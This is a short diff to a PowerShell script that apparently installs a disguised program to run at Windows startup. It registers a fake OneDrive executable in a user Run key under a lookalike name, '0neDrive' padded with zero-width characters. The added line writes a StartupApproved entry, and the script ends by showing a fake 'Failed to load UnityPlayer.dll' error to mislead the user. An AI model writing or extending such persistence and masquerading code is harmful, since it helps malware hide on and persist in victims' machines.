@@ -7,4 +7,5 @@ $exePath = "$env:APPDATA\System32\OneDrive.exe"
 $regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $regValueName = "‌‌0neDrive‌‌‌‌"
 Set-ItemProperty -Path $regKeyPath -Name $regValueName -Value $exePath
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "OneDrive" -Value ([byte[]](0x02,0x00,0x00,0x00))
 Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("Failed to load UnityPlayer.dll.", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
